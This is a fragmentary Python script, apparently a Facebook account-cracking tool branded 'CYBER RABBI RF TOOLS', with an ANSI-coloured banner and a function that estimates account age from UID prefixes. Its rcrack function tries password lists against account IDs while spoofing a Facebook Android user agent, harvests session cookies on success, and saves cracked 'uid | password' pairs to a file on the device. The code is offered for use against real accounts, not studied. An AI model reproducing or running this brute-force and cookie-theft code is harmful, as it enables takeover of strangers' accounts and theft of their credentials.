#Welcome To CYBER RABBI RF TOOLS 🌺
...
\x1b[38;5;208m〘\033[1;33m𑁍\x1b[38;5;208m〙 GITHUB  \033[1;33m  ▶ \033[1;36m CYBER  RABBI  404
\x1b[38;5;208m〘\033[1;33m𑁍\x1b[38;5;208m〙 TOOLS  \033[1;33m   ▶ \033[1;36mRANDOM  [X]  PAID
\x1b[38;5;208m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def linex():
	print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
loop = 0
...
try:
    print('\n\n\033[1;33mHEY GYZ IAM CYBER RABBI WELCOME TO MY TOOLS\033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
...
def abidmybrother(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :rabbi = ' (*-*) 2009'
        elif uid[:9] in ['100000000']         :rabbi = '√ 2009'
        elif uid[:8] in ['10000000']           :rabbi = '√ 2009'
        ...
        elif uid[:6] in ['100001']          :rabbi = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :rabbi = '√ 2011/2012'
        elif uid[:6] in ['100004']          :rabbi = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :rabbi= '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :rabbi = '√ 2014/2015'
        elif uid[:6] in ['100009']          :rabbi = '√ 2015'
        elif uid[:5] in ['10001']           :rabbi = '√ 2015/2016'
        elif uid[:5] in ['10002']           :rabbi = '√ 2016/2017'
        elif uid[:5] in ['10003']           :rabbi = '√ 2018/2019'
        elif uid[:5] in ['10004']           :rabbi = '√ 2019/2020'
        elif uid[:5] in ['10005']           :rabbi = '√ 2020'
        elif uid[:5] in ['10006','10007','']:rabbi = '√ 2021'
        elif uid[:5] in ['10008']           :rabbi = '√ 2022'
        elif uid[:5] in ['10009']           :rabbi = '√ 2023'
        else:rabbi=''
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-N976V Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/255.0.0.33.121;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;31m [rf-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/rf11-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
